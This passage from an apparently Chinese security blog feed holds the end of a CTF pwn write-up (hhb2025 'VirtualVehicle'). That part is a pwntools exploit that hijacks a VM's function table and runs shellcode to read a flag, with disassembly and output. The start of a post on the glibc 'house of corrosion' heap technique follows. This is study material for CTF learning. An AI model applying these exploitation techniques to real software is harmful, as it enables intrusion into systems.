class="line">log.success(<span class="string">&quot;new_mmap_addr --&gt; &quot;</span>+<span class="built_in">hex</span>(new_mmap_addr))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 回到我们新重启的vm，将add_reg()覆写为mmap地址，关键的操作函数维持原样</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">348</span>):</span><br><span class="line">    payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">    payload += push_imm(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">    payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;op 0x2 executed\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">push_reg_addr = elf_base + <span class="number">0x1c10</span></span><br><span class="line">push_imm32_addr = elf_base + <span class="number">0x1cd0</span></span><br><span class="line">pop_to_reg_addr = elf_base + <span class="number">0x1d10</span></span><br><span class="line"><span class="comment"># now our sp is back to normal vtable, then overwrite add()</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += push_imm(push_reg_addr &amp; <span class="number">0xffffffff</span>)  <span class="comment"># push_reg</span></span><br><span class="line">payload += push_imm((push_reg_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;op 0x2 executed\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += push_imm(push_imm32_addr &amp; <span class="number">0xffffffff</span>)  <span class="comment"># push_imm32</span></span><br><span class="line">payload += push_imm((push_imm32_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;op 0x2 executed\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += push_imm(pop_to_reg_addr &amp; <span class="number">0xffffffff</span>)  <span class="comment"># pop_to</span></span><br><span class="line">payload += push_imm((pop_to_reg_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;op 0x2 executed\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里覆写</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += push_imm(new_mmap_addr &amp; <span class="number">0xffffffff</span>)  <span class="comment"># mmap_addr</span></span><br><span class="line">payload += push_imm((new_mmap_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;op 0x2 executed\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += push_imm(read_addr &amp; <span class="number">0xffffffff</span>)  <span class="comment"># read_addr</span></span><br><span class="line">payload += push_imm((read_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;op 0x2 executed\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入shellcode来call read读入orw的shellcode</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += push_imm(<span class="number">0xf3f06700</span>)</span><br><span class="line">payload += pop_reg(<span class="number">0</span>)  <span class="comment"># pop to reg 0</span></span><br><span class="line">payload += store(<span class="number">0</span>, <span class="number">0</span>)  <span class="comment"># store to data</span></span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;op 0x2 executed\n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;op 0x3 executed\n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;op 0x7 executed\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += push_imm(<span class="number">0xfff1e100</span>)</span><br><span class="line">payload += pop_reg(<span class="number">0</span>)  <span class="comment"># pop to reg 0</span></span><br><span class="line">payload += store(<span class="number">0</span>, <span class="number">1</span>)  <span class="comment"># store to data</span></span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;op 0x2 executed\n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;op 0x3 executed\n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;op 0x7 executed\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += push_imm(<span class="number">0xe96cc900</span>)</span><br><span class="line">payload += pop_reg(<span class="number">0</span>)  <span class="comment"># pop to reg 0</span></span><br><span class="line">payload += store(<span class="number">0</span>, <span class="number">2</span>)  <span class="comment"># store to data</span></span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;op 0x2 executed\n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;op 0x3 executed\n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;op 0x7 executed\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">pre_shellcode = encrypt(<span class="number">0xf3f06700</span>)</span><br><span class="line">log.info(<span class="string">&quot;pre shellcode to call read --&gt; &quot;</span>+hexdump(pre_shellcode))</span><br><span class="line">pre_shellcode = encrypt(<span class="number">0xfff1e100</span>)</span><br><span class="line">log.info(<span class="string">&quot;pre shellcode to call read --&gt; &quot;</span>+hexdump(pre_shellcode))</span><br><span class="line">pre_shellcode = encrypt(<span class="number">0xe96cc900</span>)</span><br><span class="line">log.info(<span class="string">&quot;pre shellcode to call read --&gt; &quot;</span>+hexdump(pre_shellcode))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += add_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) <span class="comment"># 触发call read的shellcode</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">shellcode = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="number">0</span>) + shellcraft.sendfile(<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0x50</span>)).rjust(<span class="number">0x50</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">io.send(shellcode) <span class="comment"># 发送orw的shellcode</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>需要注意栈对齐：为什么空调用一次被覆盖为<code>over_read</code>的<code>sub_reg</code>可以抬栈呢？这是因为<code>vm</code>是通过<code>call reg</code>来调用对应函数表中的函数的，就以<code>sub_reg</code>的调用为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">t:0000000000002636 loc_2636:                               ; CODE XREF: main+AB↑j</span><br><span class="line">.text:0000000000002636                                         ; DATA XREF: .rodata:jpt_24DB↓o</span><br><span class="line">.text:0000000000002636                 mov     rax, cs:vm_context ; jumptable 00000000000024DB case 5</span><br><span class="line">.text:000000000000263D                 mov     rax, [rax+28h]</span><br><span class="line">.text:0000000000002641                 mov     edx, [rbp+var_8]</span><br><span class="line">.text:0000000000002644                 movsxd  rdx, edx</span><br><span class="line">.text:0000000000002647                 add     rdx, 1</span><br><span class="line">.text:000000000000264B                 add     rax, rdx</span><br><span class="line">.text:000000000000264E                 movzx   eax, byte ptr [rax]</span><br><span class="line">.text:0000000000002651                 mov     [rbp+var_18], al</span><br><span class="line">.text:0000000000002654                 mov     rax, cs:vm_context</span><br><span class="line">.text:000000000000265B                 mov     rax, [rax+28h]</span><br><span class="line">.text:000000000000265F                 mov     edx, [rbp+var_8]</span><br><span class="line">.text:0000000000002662                 movsxd  rdx, edx</span><br><span class="line">.text:0000000000002665                 add     rdx, 2</span><br><span class="line">.text:0000000000002669                 add     rax, rdx</span><br><span class="line">.text:000000000000266C                 movzx   eax, byte ptr [rax]</span><br><span class="line">.text:000000000000266F                 mov     [rbp+var_17], al</span><br><span class="line">.text:0000000000002672                 mov     rax, cs:vm_context</span><br><span class="line">.text:0000000000002679                 mov     rax, [rax+28h]</span><br><span class="line">.text:000000000000267D                 mov     edx, [rbp+var_8]</span><br><span class="line">.text:0000000000002680                 movsxd  rdx, edx</span><br><span class="line">.text:0000000000002683                 add     rdx, 3</span><br><span class="line">.text:0000000000002687                 add     rax, rdx</span><br><span class="line">.text:000000000000268A                 movzx   eax, byte ptr [rax]</span><br><span class="line">.text:000000000000268D                 mov     [rbp+var_16], al</span><br><span class="line">.text:0000000000002690                 mov     rax, cs:vm_context</span><br><span class="line">.text:0000000000002697                 mov     rax, [rax]</span><br><span class="line">.text:000000000000269A                 mov     r8, [rax+20h]</span><br><span class="line">.text:000000000000269E                 movsx   edx, [rbp+var_16]</span><br><span class="line">.text:00000000000026A2                 movsx   ecx, [rbp+var_17]</span><br><span class="line">.text:00000000000026A6                 movsx   eax, [rbp+var_18]</span><br><span class="line">.text:00000000000026AA                 mov     esi, ecx</span><br><span class="line">.text:00000000000026AC                 mov     edi, eax</span><br><span class="line">.text:00000000000026AE                 call    r8</span><br><span class="line">.text:00000000000026B1                 lea     rdi, aOp0x5Executed ; &quot;op 0x5 executed&quot;</span><br><span class="line">.text:00000000000026B8                 call    _puts</span><br><span class="line">.text:00000000000026BD                 jmp     loc_2899</span><br></pre></td></tr></table></figure><p>这里的<code>call r8</code>也就调用了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">t:0000000000001E80                 endbr64</span><br><span class="line">.text:0000000000001E84                 push    rbp</span><br><span class="line">.text:0000000000001E85                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001E88                 sub     rsp, 10h</span><br><span class="line">.text:0000000000001E8C                 mov     ecx, esi</span><br><span class="line">.text:0000000000001E8E                 mov     eax, edx</span><br><span class="line">.text:0000000000001E90                 mov     edx, edi</span><br><span class="line">.text:0000000000001E92                 mov     [rbp+var_4], dl</span><br><span class="line">.text:0000000000001E95                 mov     edx, ecx</span><br><span class="line">.text:0000000000001E97                 mov     [rbp+var_8], dl</span><br><span class="line">.text:0000000000001E9A                 mov     [rbp+var_C], al</span><br><span class="line">.text:0000000000001E9D                 cmp     [rbp+var_4], 3</span><br><span class="line">.text:0000000000001EA1                 jg      short loc_1EC1</span><br><span class="line">.text:0000000000001EA3                 cmp     [rbp+var_4], 0</span><br><span class="line">.text:0000000000001EA7                 js      short loc_1EC1</span><br><span class="line">.text:0000000000001EA9                 cmp     [rbp+var_8], 3</span><br><span class="line">.text:0000000000001EAD                 jg      short loc_1EC1</span><br><span class="line">.text:0000000000001EAF                 cmp     [rbp+var_8], 0</span><br><span class="line">.text:0000000000001EB3                 js      short loc_1EC1</span><br><span class="line">.text:0000000000001EB5                 cmp     [rbp+var_C], 3</span><br><span class="line">.text:0000000000001EB9                 jg      short loc_1EC1</span><br><span class="line">.text:0000000000001EBB                 cmp     [rbp+var_C], 0</span><br><span class="line">.text:0000000000001EBF                 jns     short loc_1ED7</span><br><span class="line">.text:0000000000001EC1</span><br><span class="line">.text:0000000000001EC1 loc_1EC1:                               ; CODE XREF: op_sub_reg+21↑j</span><br><span class="line">.text:0000000000001EC1                                         ; op_sub_reg+27↑j ...</span><br><span class="line">.text:0000000000001EC1                 lea     rdi, aWrongRegIndex ; &quot;Wrong reg index.&quot;</span><br><span class="line">.text:0000000000001EC8                 call    _puts</span><br><span class="line">.text:0000000000001ECD                 mov     edi, 0          ; status</span><br><span class="line">.text:0000000000001ED2                 call    __exit</span><br><span class="line">.text:0000000000001ED7 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001ED7</span><br><span class="line">.text:0000000000001ED7 loc_1ED7:                               ; CODE XREF: op_sub_reg+3F↑j</span><br><span class="line">.text:0000000000001ED7                 mov     rax, cs:vm_context</span><br><span class="line">.text:0000000000001EDE                 mov     rax, [rax+18h]</span><br><span class="line">.text:0000000000001EE2                 movsx   rdx, [rbp+var_8]</span><br><span class="line">.text:0000000000001EE7                 shl     rdx, 2</span><br><span class="line">.text:0000000000001EEB                 add     rax, rdx</span><br><span class="line">.text:0000000000001EEE                 mov     ecx, [rax]</span><br><span class="line">.text:0000000000001EF0                 mov     rax, cs:vm_context</span><br><span class="line">.text:0000000000001EF7                 mov     rax, [rax+18h]</span><br><span class="line">.text:0000000000001EFB                 movsx   rdx, [rbp+var_C]</span><br><span class="line">.text:0000000000001F00                 shl     rdx, 2</span><br><span class="line">.text:0000000000001F04                 add     rax, rdx</span><br><span class="line">.text:0000000000001F07                 mov     edx, [rax]</span><br><span class="line">.text:0000000000001F09                 mov     rax, cs:vm_context</span><br><span class="line">.text:0000000000001F10                 mov     rax, [rax+18h]</span><br><span class="line">.text:0000000000001F14                 movsx   rsi, [rbp+var_4]</span><br><span class="line">.text:0000000000001F19                 shl     rsi, 2</span><br><span class="line">.text:0000000000001F1D                 add     rax, rsi</span><br><span class="line">.text:0000000000001F20                 sub     ecx, edx</span><br><span class="line">.text:0000000000001F22                 mov     edx, ecx</span><br><span class="line">.text:0000000000001F24                 mov     [rax], edx</span><br><span class="line">.text:0000000000001F26                 mov     eax, 0</span><br><span class="line">.text:0000000000001F2B                 leave</span><br><span class="line">.text:0000000000001F2C                 retn</span><br><span class="line">.text:0000000000001F2C ; &#125; // starts at 1E80</span><br></pre></td></tr></table></figure><p>可以看到最后是有<code>ret</code>与这个<code>call</code>来对应，从而整个调用不会影响栈；但是在我们覆盖其为<code>over_read</code>之后，<code>call r8</code>调用的变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">t:0000000000002841 loc_2841:                               ; CODE XREF: main+3F4↑j</span><br><span class="line">.text:0000000000002841                 mov     rax, cs:vm_context</span><br><span class="line">.text:0000000000002848                 mov     rax, [rax+28h]</span><br><span class="line">.text:000000000000284C                 mov     edx, [rbp+var_8]</span><br><span class="line">.text:000000000000284F                 movsxd  rdx, edx</span><br><span class="line">.text:0000000000002852                 add     rdx, 5</span><br><span class="line">.text:0000000000002856                 add     rax, rdx</span><br><span class="line">.text:0000000000002859                 mov     edx, 100h       ; nbytes</span><br><span class="line">.text:000000000000285E                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000002861                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000002866                 call    _read</span><br><span class="line">.text:000000000000286B                 mov     rax, cs:vm_context</span><br><span class="line">.text:0000000000002872                 mov     rax, [rax+28h]</span><br><span class="line">.text:0000000000002876                 mov     edx, [rbp+var_8]</span><br><span class="line">.text:0000000000002879                 movsxd  rdx, edx</span><br><span class="line">.text:000000000000287C                 add     rdx, 19h</span><br><span class="line">.text:0000000000002880                 add     rax, rdx</span><br><span class="line">.text:0000000000002883                 mov     byte ptr [rax], 0</span><br><span class="line">.text:0000000000002886                 mov     [rbp+var_C], 114514h</span><br><span class="line">.text:000000000000288D                 jmp     short loc_2899</span><br></pre></td></tr></table></figure><p>可以看到是<code>jmp</code>跳转回去的，那么<code>call</code>指令压栈的返回地址没有弹出，也就造成了抬栈的效果<br>另外还需要<code>over_read</code>选项的截断问题<br>同时避免<code>store</code>写入<code>shellcode</code>麻烦（需要绕过加密），先造一个<code>read</code>来读入后续<code>shellcode</code><br>效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received 0x24 bytes:</span><br><span class="line">    b&#x27;flag&#123;this-is-test-flag-for-hhb2025&#125;\n&#x27;</span><br><span class="line">flag&#123;this-is-test-flag-for-hhb2025&#125;</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Process &#x27;/home/r3t2/ctf/hhb2025/VirtualVehicle/pwn&#x27; stopped with exit code -11 (SIGSEGV) (pid 23995)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> vm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于house of corrosion</title>
      <link href="/2025/09/14/%E5%85%B3%E4%BA%8Ehouse-of-corrosion/"/>
      <url>/2025/09/14/%E5%85%B3%E4%BA%8Ehouse-of-corrosion/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>网谷杯没报名上没打成，但是题目不算难，其中一道堆题用到了<code>house of corrosion</code>，学习一下<br>参考博客<a href="https://xz.aliyun.com/news/6458">https://xz.aliyun.com/news/6458</a><br><a href="https://www.anquanke.com/post/id/263622">https://www.anquanke.com/post/id/263622</a><br>源码分析为<code>glibc2.35</code><br>这个手法也有针对<code>tcache</code>的变体，这里姑且先只分析针对<code>fastbins</code>的手法，后续再说（<del>咕咕</del>）<br>到 <code>glibc2.37</code> 之后，<code>global_max_fast</code> 的类型被修改为 <code>int8_t</code>，使用该技巧可以控制的地址范围大大缩小。</p><h2 id="0x01-global-max-fast-与-fastbinsY"><a href="#0x01-global-max-fast-与-fastbinsY" class="headerlink" title="0x01 global_max_fast 与 fastbinsY"></a>0x01 global_max_fast 与 fastbinsY</h2><p>在<code>malloc</code>的初始化时，会设置全局变量<code>global_max_fast</code>的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Initialize a malloc_state struct.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This is called from ptmalloc_init () or from _int_new_arena ()</span></span><br><span class="line"><span class="comment">   when creating a new arena.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Establish circular links for normal bins */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  set_noncontiguous (av);</span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast (DEFAULT_MXFAST);</span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  av-&gt;top = initial_top (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个默认值是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEFAULT_MXFAST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>再找到<code>malloc-size.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INTERNAL_SIZE_T</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding word size.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span></span><br></pre></td></tr></table></figure><p>默认是<code>(64 * 8/2) == 0x80</code>，默认情况下<code>fastbins</code>的最大<code>chunk</code>是<strong>0x80</strong><br>然后我们看<code>fastbin</code>索引方式，在<code>main_arena</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>main_arena</code>中，管理<code>fastbins</code>使用<code>fastbinsY</code>数组，与之相关的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 